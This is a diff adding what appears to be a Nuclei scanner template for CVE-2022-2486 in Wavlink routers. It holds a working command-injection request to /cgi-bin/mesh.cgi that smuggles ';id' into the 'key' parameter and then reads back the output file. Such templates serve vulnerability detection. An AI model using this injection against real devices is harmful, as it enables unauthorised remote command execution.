@@ -1,0 +1,35 @@
+id: cve-2022-2486
+info:
+  name: Wavlink Router Remote Command Execution (CVE-2022-2486)
+  author: ProjectDiscoveryAI
+  severity: critical
+  tags: rce,cve,critical
+  metadata:
+    devices: ["wl-wn535k3_firmware", "wl-wn535k2_firmware", "wl-wn535k2", "wl-wn535k3"]
+variables:
+  filename: "{{to_lower(rand_text_alphanumeric(10))}}"
+http:
+  - id: rce-command-injection
+    method: POST
+    path:
+      - "/cgi-bin/mesh.cgi?page=upgrade&key=%27;id%3E%3E{{filename}}.txt'"
+    headers:
+      Content-Type: application/x-www-form-urlencoded
+    body: |
+      page=night_led&start_hour=;;
+    matchers:
+      - type: status
+        status:
+          - 500
+  - id: verify-command-output
+    method: GET
+    path:
+      - "/cgi-bin/{{filename}}.txt"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: regex
+        regex:
+          - "uid=\\d+\\(.*?\\)\\s+gid=\\d+\\(.*?\\)"
